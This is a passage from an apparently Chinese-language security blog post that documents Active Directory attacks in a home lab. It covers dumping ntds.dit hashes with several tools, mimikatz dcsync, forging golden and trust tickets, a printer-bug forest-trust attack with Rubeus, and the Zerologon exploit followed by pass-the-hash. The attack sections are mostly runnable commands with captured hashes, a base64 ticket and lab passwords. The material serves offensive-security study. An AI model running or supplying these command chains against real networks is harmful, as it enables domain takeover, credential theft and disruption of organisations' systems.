https://github.com/SecureAuthCorp/impacketcd impacketsudo python3 setup.py installcd ..cd examplepython3 secretsdump.py -system /目录/system.hive -ntds /目录/ntds.dit LOCAL</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706222324453.png" alt="image-20220706222324453"></p><h4 id="PowerShell下的利用"><a href="#PowerShell下的利用" class="headerlink" title="PowerShell下的利用"></a>PowerShell下的利用</h4><p>DSInternals PowerShell模块提供了构建在框架之上的易于使用的cmdlet。主要功能包括离线ntds.dit文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p><p>下载地址：<a href="https://github.com/MichaelGrafnetter/DSInternals">https://github.com/MichaelGrafnetter/DSInternals</a></p><p>支持系统：</p><ul><li>Windows Server 2012 R2</li><li>Windows Server 2008 R2</li><li>Windows 10 64-bit</li><li>Windows 8.1 64-bit</li><li>Windows 7 64-bit</li></ul><p>安装与配置方法：</p><pre><code class="shell">PowerShell 5.0：Install-Module DSInternals或Install-Module -Name DSInternals -RequiredVersion 3.2.1PowerShell 3.0、4.0：解压压缩包 cd C:\DSInternalsImport-Module .\DSInternals</code></pre><p>使用DSInternals模块提取用户哈希值，我们需要先获取Ntds.dit、SYSTEM这两个文件。将Ntds.dit、SYSTEM这两个文件导出并拖到我们本地后，即可执行如下命令获取所有账户哈希：</p><pre><code class="shell">Import-Module DSInternals       // 导入DSInternals模块// 获取所有账户信息：$key = Get-Bootkey -SystemHivePath &#39;C:\目录\system.hive&#39;    Get-ADDBAccount -All -DBPath &#39;C:\目录\ntds.dit&#39; -Bootkey $key</code></pre><p>还可以导出支持Hashcat格式的哈希：</p><pre><code class="shell">$key = Get-Bootkey -SystemHivePath &#39;C:\目录\system.hive&#39;Get-ADDBAccount -All -DBPath &#39;C:\目录\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt</code></pre><h4 id="使用NTDSDumpex-exe可以导出散列值"><a href="#使用NTDSDumpex-exe可以导出散列值" class="headerlink" title="使用NTDSDumpex.exe可以导出散列值"></a>使用NTDSDumpex.exe可以导出散列值</h4><p>使用NTDSDumpex.exe可以进行导出散列值的操作。</p><p>将ntds.dit、NTDSDumpex.exe、system.hive 放在同一目录下，输入如下命令即可导出域账号和散列值。</p><p>NTDSDumpEx.exe下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx">https://github.com/zcgonvh/NTDSDumpEx</a></p><p>获取key：reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</p><p>使用NTDSDumpEx获取所有域用户的Hash</p><pre><code class="shell">NTDSDumpEx.exe -d ntds.dit -s system.hive -o hash.txt</code></pre><h4 id="在线利用dcsync获取提取Ntds-dit中的哈希"><a href="#在线利用dcsync获取提取Ntds-dit中的哈希" class="headerlink" title="在线利用dcsync获取提取Ntds.dit中的哈希"></a>在线利用dcsync获取提取Ntds.dit中的哈希</h4><p>DCSync是Mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，其能够利用卷影拷贝服务直接读取ndts.dit并导出域内所有用户的哈希值。需要管理员权限。</p><p>Mimikatz下载地址：<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>利用Mimikatz的dcsync功能获取提取Ntds.dit中的哈希的操作如下：</p><p>在域内任意一台主机上运行mimikatz并执行如下命令：</p><pre><code>lsadump::dcsync /domain:xxx.com /all /csvlsadump::dcsync /domain:god.org /all /csv</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706225104256.png" alt="image-20220706225104256"></p><p>或者</p><pre><code class="shell">privilege::debugloglsadump::lsa /inject</code></pre><h4 id="在线-PowerShell提取Ntds-dit中的哈希"><a href="#在线-PowerShell提取Ntds-dit中的哈希" class="headerlink" title="在线-PowerShell提取Ntds.dit中的哈希"></a>在线-PowerShell提取Ntds.dit中的哈希</h4><p>即Invoke-DCSync.ps1脚本。</p><p>下载地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><p>该脚本通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能，并利用dcsync直接读取ntds.dit得到域用户密码散列值。</p><p>在域内任何一台主机上面执行如下命令：</p><pre><code class="shell">Set-Executionpolicy bypassImport-Module .\Invoke-DCSync.ps 1Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hashInvoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      // 导出域内administrator账户的hash</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707102847191.png" alt="image-20220707102847191"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707102954770.png" alt="image-20220707102954770"></p><h4 id="在线-使用metasploit获取域散列"><a href="#在线-使用metasploit获取域散列" class="headerlink" title="在线-使用metasploit获取域散列"></a>在线-使用metasploit获取域散列</h4><ul><li>Ntds.dit(也被称为Active Directory database)包含了当前域用户中所有的用户的账号信息和其hash值</li><li>默认路径: C:\Windows\NTDS</li><li>只能通过域控制器进程和协议访问</li></ul><p>可能用到的模块:</p><pre><code>post/windows/gather/ntds_location #该模块可查看路径ntdspost/windows/gather/smart_hashdump #在线导出域账户hash(建议2012以上使用)auxiliary/admin/smb/psexec_ntdsgrab #利用域管账户，导出ntds必要文件到本地post/windows/gather/ntds_grabber #利用powershell将ntds必要文件下载到本地后使用post/windows/gather/credentials/domain_hashdump #介绍其方法</code></pre><h4 id="在线-使用vshadow和QuarksPwDump导出域账号和域散列值"><a href="#在线-使用vshadow和QuarksPwDump导出域账号和域散列值" class="headerlink" title="在线-使用vshadow和QuarksPwDump导出域账号和域散列值"></a>在线-使用vshadow和QuarksPwDump导出域账号和域散列值</h4><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p><p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p><p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p><p>QuarksPwDump 下载地址：<a href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p><p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p><pre><code class="shell">setlocalif NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACKset SOURCE_DRIVE_LETTER=%SystemDrive%set SOURCE_RELATIVE_PATH=windows\ntds\ntds.ditset DESTINATION_PATH=%~dp0@echo ...Determine the scripts to be executed/generated...set CALLBACK_SCRIPT=%~dpnx0set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy...&quot;%~dp0vshadow.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%del /f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%reg save hklm\system system.hive</code></pre><p>shadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p><p>在这个项目中，作者已经给出了shadow.exe:</p><p><a href="https://github.com/tuthimi/quarkspwdump/tree/master/ShadowCopy">https://github.com/tuthimi/quarkspwdump/tree/master/ShadowCopy</a></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162512699.png" alt="image-20220707162512699"></p><p>选择对应版本下载即可</p><p>将这三个程序放到一个文件夹中，执行ShowCopy.bat</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162553598.png" alt="image-20220707162553598"></p><p>执行后:</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162651423.png" alt="image-20220707162651423"></p><p>使用 esentutl 修复导出的 ntds.dit 文件:</p><pre><code class="shell">esentutl /p /o ntds.dit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162752787.png" alt="image-20220707162752787"></p><p>最后通过 QuarksPwDump.exe 导出域账号和散列值:</p><pre><code class="shell">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o result.txt</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162932295.png" alt="image-20220707162932295"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162952291.png" alt="image-20220707162952291"></p><h2 id="跨域攻击分析及防御"><a href="#跨域攻击分析及防御" class="headerlink" title="跨域攻击分析及防御"></a>跨域攻击分析及防御</h2><h3 id="域间信任概述"><a href="#域间信任概述" class="headerlink" title="域间信任概述"></a>域间信任概述</h3><p><strong>为什么会有域信任?</strong></p><p>在同一个域内，管理员可以实现资源的统一管理、分配。有些企业会用到多个域，创建域间信任可以方便跨域资源分配。</p><p><strong>信任是有方向的:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707170708834.png" alt="image-20220707170708834"></p><p><strong>信任传递:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707170843465.png" alt="image-20220707170843465"></p><p><strong>域树和域林:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171001846.png" alt="image-20220707171001846"></p><p><strong>域间信任实例:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171110376.png" alt="image-20220707171110376"></p><p><strong>域间信任分类</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171153927.png" alt="image-20220707171153927"></p><h3 id="域间信任信息收集、利用思路"><a href="#域间信任信息收集、利用思路" class="headerlink" title="域间信任信息收集、利用思路"></a>域间信任信息收集、利用思路</h3><p><strong>环境搭建</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171848435.png" alt="image-20220707171848435"></p><p><strong>查看域间信任</strong></p><p>命令:</p><pre><code class="shell">nltest /domain_trusts  /primary 仅返回计算机账户属于的域 # 如nltest /domain_trusts /primary/forest 仅返回主域同一森林下的域/direct_out 返回被主域明确信任的域/direct_in 返回明确信任主域的域/all_trusts 返回所有已信任的域/V 显示详细的输出，包括域的SIDs和GUIDs</code></pre><pre><code>netdom query trust #只能在域控上使用</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711230039383.png" alt="image-20220711230039383"></p><p><strong>工具:</strong></p><p><strong>收集域详细信息:</strong></p><p>powerview</p><p>下载链接:<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>一般不允许执行，可使用ISESteroids模块绕过</p><pre><code class="shell">PowerShell.exe -ExecutionPolicy Bypass -command &quot;..\powerview.ps1;Get-NetDomainTrust&quot;</code></pre><p>adfind：</p><p>下载链接:<a href="http://www.joeware.net/freetools/tools/adfind/">http://www.joeware.net/freetools/tools/adfind/</a></p><ul><li>-appver：显示adfind版本信息</li><li>-b：指定要查询的根节点basedn</li><li>-bit：指定位查询</li><li>-c:  只统计数量</li><li>-csv：导出为csv格式</li><li>-dn：只显示dn，不返回详细信息</li><li>-f：LDAP过滤条件，指定ldap语法</li><li>-h：指定主机与端口(ip:port)</li><li>-recmute：删除dn下面没有的</li><li>-s：搜索的范围， 有 one(当前层级)/sub(一层一层递归)，默认是sub</li><li>-sdna：非域管查询sd信息</li><li>-t：查询超时时间，默认120秒</li><li>-u：指定用户</li><li>-up：指定用户的密码</li></ul><pre><code>adfind.exe -h ip -sc u:* #如 AdFind.exe -h WIN-OSOIFGPM536.sakura.com -sc u:Administrator</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710000000436.png" alt="image-20220710000000436"></p><p>adexplorer</p><p>下载链接:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer</a></p><p>输入域控的账号密码就可以进行管理</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710092143570.png" alt="image-20220710092143570"></p><p><strong>收集域网络信息:</strong></p><p>nltest、ping、dnscmd</p><pre><code>nltest /domain_trustsnltest /dclist:companyping sakura.comdnscmd /enumzones</code></pre><p><strong>利用思路</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710093631488.png" alt="image-20220710093631488"></p><h3 id="跨域攻击"><a href="#跨域攻击" class="headerlink" title="跨域攻击"></a>跨域攻击</h3><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094448657.png" alt="image-20220710094448657"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094713427.png" alt="image-20220710094713427"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094732640.png" alt="image-20220710094732640"></p><h4 id="SIDHistory介绍和利用"><a href="#SIDHistory介绍和利用" class="headerlink" title="SIDHistory介绍和利用"></a>SIDHistory介绍和利用</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094901181.png" alt="image-20220710094901181"></p><p><strong>利用域信任密钥获取目标域权限</strong></p><ul><li><p>存在信任账户的情况下：Dcsync获取信任账号的NTLM值</p></li><li><pre><code>Get-ADUser -Filter &#123;samAccountName -like &quot;*$&quot;&#125; #如何无法找到Get-ADuser命令，则导入模块 import-module activedirectory</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711231847885.png" alt="image-20220711231847885"></p><ul><li><pre><code class="shell">.\mimikatz.exe &quot;lsadump::dcsync /user:sakura$@HY.sakura.com&quot; exit</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711231746078.png" alt="image-20220711231746078"></p><hr><ul><li><p>内部信任:lsadump获取信任账号的NTLM值</p></li><li><pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:sakura$&quot; &quot;lsadump::trust /patch&quot; exit</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711232854715.png" alt="image-20220711232854715"></p><p><strong>信任票据的创建</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710102754875.png" alt="image-20220710102754875"></p><pre><code class="shell">.\mimikatz.exe &quot;Kerberos::golden /domain:HY.sakura.com /sid:S-1-5-21-3349743833-377928606-3985385106 /sids:S-1-5-21-1090921569-2929606133-4003408593-519 /rc4:56de60dc2e57db6b03fc5e9834965f26 /user:sakura /service:krbtgt /target:sakura.com /ticket:sakura.kirbi&quot; #/ticket后面的含义是保存的文件名</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235022847.png" alt="image-20220711235022847"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235119876.png" alt="image-20220711235119876"></p><p>我们先看，目前是无法访问父域资源的</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235628387.png" alt="image-20220711235628387"></p><p><strong>TGS获取和利用</strong></p><pre><code>.\asktgs.exe C:\Users\Administrator\Desktop\sakura.kirbi CIFS/fy.sakura.com</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000226225.png" alt="image-20220712000226225"></p><pre><code class="shell">.\kirbikator.exe lsa .\CIFS.fy.sakura.com.kirbi</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000341715.png" alt="image-20220712000341715"></p><p>然后就可以成功对子域进行操作了</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000536307.png" alt="image-20220712000536307"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712001240811.png" alt="image-20220712001240811"></p><h4 id="利用krbtgt散列获取目标域权限"><a href="#利用krbtgt散列获取目标域权限" class="headerlink" title="利用krbtgt散列获取目标域权限"></a>利用krbtgt散列获取目标域权限</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712110239522.png" alt="image-20220712110239522"></p><p><strong>kebtgt散列获取</strong></p><pre><code class="shell">privilege::debuglsadump::lsa /patch /user:krbtgtsekurlsa::krbtgtexit</code></pre><p>或者直接合并成一句话</p><pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:krbtgt&quot; &quot;sekurlsa::krbtgt&quot; &quot;exit&quot;</code></pre><p><strong>构造并注入黄金票据</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712111832854.png" alt="image-20220712111832854"></p><pre><code class="shell">.\mimikatz.exe &quot;Kerberos::golden /user:administrator /domain:HY.sakura.com /sid:S-1-5-21-3349743833-377928606-3985385106 /sids:S-1-5-21-1090921569-2929606133-4003408593-519 /krbtgt:803b57a2a73cdc03133e631db7f506ad /ptt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712111644256.png" alt="image-20220712111644256"></p><h3 id="林信任攻击"><a href="#林信任攻击" class="headerlink" title="林信任攻击"></a>林信任攻击</h3><p>我这里设置两个域:</p><p>sakura.com、salmon.com</p><p>一台 ly-1 密码:yk2012.com</p><p>一台 ly-2 密码:yk-22012.com</p><h4 id="MS-RPPRN获取信任林权限"><a href="#MS-RPPRN获取信任林权限" class="headerlink" title="MS-RPPRN获取信任林权限"></a>MS-RPPRN获取信任林权限</h4><p><strong>利用条件</strong>:需要设置一台主机账户开启了非约束委派域内机器的权限，实际可配合powerview脚本查找主机，域控主机需要为win2012 server r2 以上 版本，Print Spooler服务默认是自动运行的</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712112745485.png" alt="image-20220712112745485"></p><p><strong>实验场景:</strong></p><ul><li>已获得一个林的权限(EA).。本例为sakura.com</li><li>配置了无约束委派的、已被攻击者控制的一台服务器(ly-1.sakura.com)</li><li>在演示案例中，攻击者入侵了根域的域控制器(DC),利用该DC攻击另一个域林中的另一个DC</li><li>目标域林:本例中为salmon.com</li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713162710957.png" alt="image-20220713162710957"></p><p><strong>攻击示意图</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712150156656.png" alt="image-20220712150156656"></p><p><strong>利用工具</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712150254348.png" alt="image-20220712150254348"></p><pre><code class="shell">.\Rubeus.exe monitor /interval:5 /filteruser:ly-2$</code></pre><p>interval参数用于设置监控的时间间隔，单位为秒；filteruser用于指定渗透测试中需要关注的用户</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713160424988.png" alt="image-20220713160424988"></p><pre><code class="shell">.\SpoolSample.exe ly-2.salmon.com ly-1.sakura.com</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713155559395.png" alt="image-20220713155559395"></p><p>此时rubeus监听到了TGT</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713160359007.png" alt="image-20220713160359007"></p><p>使用Rubeus工具直接把base64字符串导入票据：</p><pre><code class="shell">.\Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIBBaEDAgEWooIEBjCCBAJhggP+MIID+qADAgEFoQwbClNBTE1PTi5DT02iHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbClNBTE1PTi5DT02jggPCMIIDvqADAgESoQMCAQKiggOwBIIDrBG1txlv0N5lRuOFLSbrz8uiCgjf4LwfNvlgi5p0Q80N4A9p301eRDthpV4Bwd7JCHjL7tQ/gZNU3cbA6PO3YCpg5AiVYcR7OnvfIU2LByxKN2iA4YMXRTIhFJZlRiuu4Wh2CQVbDHM+WR8rTHwnAetzq9uOkUrL7HiyK09IT1dmaQS5z7jm3WoRiSfqzfqrqpkrYUXHrKTNmeqdOxX9moYgpsFjKXwMZdHVcmnDLndt147OhMQfFOKwiVtN29YH/rvbmJnrYVLu6ZWZZpi7bj/bXY9pY8GeoNGxJMVZbiULiRnfToi0Db8DMpo115omCnsX7qfquZp5NmbyzO2/V1jknoUQ6k2qIvF+bvjydlh1PciiWxosTAMbD6bJMvwUUT78DZN6IRW9Dg0p3PgVexL73/BwCJ8f89cMzdXh7kZHm/ozhJI9uf1p0v9J2tu0g3flGDo+MF+VZBYBgVXNHiCM1oQGuEPI0Lx2Xs1JR5CCq4HdGh0tNgBIc7ppYg9W8S+6OfZU8dyQdtFh2Rc76CNHEipCzCZYBTctIJ5IV02oPzTM3lvQrbd2BsDBpWPqlV3u/7r5vm2ywp81yA2n7ZCYrZP+F9NP46IXIQ0hKT9VKoNf5ODqbH7H+0bfZogAMuMNN7Bs746NyC7qjhUbRWlmtRNfSlNqaHvsXdzcG7s87gTO9bS0v4Vxxf1ZFGnjsXfia/zvjIFymUdTJzak86FjyCj9HzxWmnSnImwT2WShnWex+S5PfOnuH7Mu8hSe/riKpdK1HdrRL3hBhhsT+vE3HNmLr7DIF0iZ5523Fibp0tOAgGf0LABdHa60anzlOSR5k2gWLSa4JifMxjohaQ5VUt3af6hewd67ZuTL9afVJyvYgAhjOsG7WEPJ1xgN3kOSp9KO+gZV7h9nKEeSScCaIDp5N29fU9CSxOzfQwct7i12BJwSGCK17S3M84v3DSXZWHmq891p2rw4Sr8BBEOE0FDfRhdnboNzkQ5Qf7CS2pafxLxtfQDiWKu2JQdRzNrLkb30zTBG4/uY/o9TBiN5mPSOPSjEqKVurkU3T0M1mYGaX9S0NdppQHKTMDEFdSMY58YzQ25PaEqMqUlvwI0V8c4cVRHsAtefz8GPfHS1I5ENB0OsSoRmWfel0T9/XX7gUjxgf4pQDYzLKb+WZm2fVMKVfB+U2kLcDC3oQ2wnRkmAYLYxJrKOVJRQVlPbIwhCsaP0JYX658qEA6BO9DjhJbz4jfXzOL+TH7ejgd0wgdqgAwIBAKKB0gSBz32BzDCByaCBxjCBwzCBwKArMCmgAwIBEqEiBCAsySonk73tkRU5Ja0UNRWW/zhAgUSZuBym4G3BFO7qKqEMGwpTQUxNT04uQ09NohIwEKADAgEBoQkwBxsFTFktMiSjBwMFAGChAAClERgPMjAyMjA3MTMwNzM0NDRaphEYDzIwMjIwNzEzMTczNDQ0WqcRGA8yMDIyMDcxMzE3MzQ0NFqoDBsKU0FMTU9OLkNPTakfMB2gAwIBAqEWMBQbBmtyYnRndBsKU0FMTU9OLkNPTQ==</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713163130505.png" alt="image-20220713163130505"></p><pre><code class="shell">.\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:salmon.com /user:krbtgt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713163220750.png" alt="image-20220713163220750"></p><pre><code class="shell">.\mimikatz.exe &quot;kerberos::list&quot; exit.\mimikatz.exe &quot;kerberos::purge&quot; exit.\mimikatz.exe &quot;kerberos::list&quot; exit.\mimikatz.exe &quot;kerberos::golden /user:administrator /domain:salmon.com /sid:S-1-5-21-3200352805-2293635123-428118185 /rc4:8da01a075e60007f23b3ce18b77b9a0f /ptt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713164513444.png" alt="image-20220713164513444"></p><p><strong>进一步利用，命令执行</strong></p><pre><code>.\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:salmon.com /all /csv&quot; exit</code></pre><p>获得信息:</p><pre><code class="shell">1104    SAKURA$ 76771a6354707379eb4bfd77a28224e5        20801001    LY-2$   0d9a393377c2f46a3b2a20a95954e540        532480500     Administrator   8168027b15e25c5d6ad39528429229d6        512502     krbtgt  8da01a075e60007f23b3ce18b77b9a0f        514</code></pre><pre><code>python3 ./wmiexec.py -hashes ad3b435b51404eeaad3b435b51404ee:8168027b15e25c5d6ad39528429229d6 ly-2.salmon.com/administrator@192.168.64.151</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713171855227.png" alt="image-20220713171855227"></p><h4 id="扩展-CVE-2020-1472-windows域控提权"><a href="#扩展-CVE-2020-1472-windows域控提权" class="headerlink" title="扩展 CVE-2020-1472 windows域控提权"></a>扩展 CVE-2020-1472 windows域控提权</h4><p>CVE-2020-1472 是⼀个 windows 域控中严重的远程权限提升漏洞，攻击者通过 NetLogon，建⽴与域控间易受攻击的安全通道时，可利⽤此漏洞获取域管访问权限（将域控中保存在AD中的管理员password设置为空）；其漏洞原理是发⽣在 RPC 认证过程的过程中，由于错误的使⽤了 AES-CFB8 加密所导致漏洞成因，该漏洞适⽤于 Win2008 后的所有版本</p><p>利用场景：获取了一个加入了域的计算机权限，在域普通账号的情况下，将域管密码置空，导出域管hash，然后进行连接 </p><p>ps：在实战环境中，由于会把域控机器的账户和密码清空，所以有可能会导致域内出问题，可能导致某些服务⽆法正常运⾏，严重会造成脱域等情况，请谨慎利⽤。</p><p>前置条件：目标域控存在此漏洞未打补丁，这个漏洞用到了MS-NRPC协议，用到了135端口</p><p>注意：在检测或者执行exp的时候，所在主机不一定加入域环境中，在涉及域解析的时候直接在hosts里面设置域名对应ip就行</p><p>复现步骤:</p><p>首先获取主机名:</p><pre><code class="shell">nbtstat -A 192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713221143362.png" alt="image-20220713221143362"></p><p><strong>探测是否存在漏洞:</strong></p><p>链接:<a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713223158821.png" alt="image-20220713223158821"></p><p><strong>存在漏洞，下一步拿exp去打</strong></p><p>exp链接:<a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><pre><code class="shell">python3 cve-2020-1472-exploit.py ly-1 192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713223643646.png" alt="image-20220713223643646"></p><p><strong>导出密码</strong></p><pre><code class="shell">python3 secretsdump.py sakura.com/ly-1\$@192.168.64.150    -no-pass &gt; ~/Desktop/pass.txt</code></pre><p>ps:kali $前要加个转义符号！</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713230309872.png" alt="image-20220713230309872"></p><p><strong>连接上去</strong></p><pre><code class="shell">python3 ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:07d312335be3ab7eceda2a6d341e5cbb ly-1.sakura.com/administrator@192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713230637115.png" 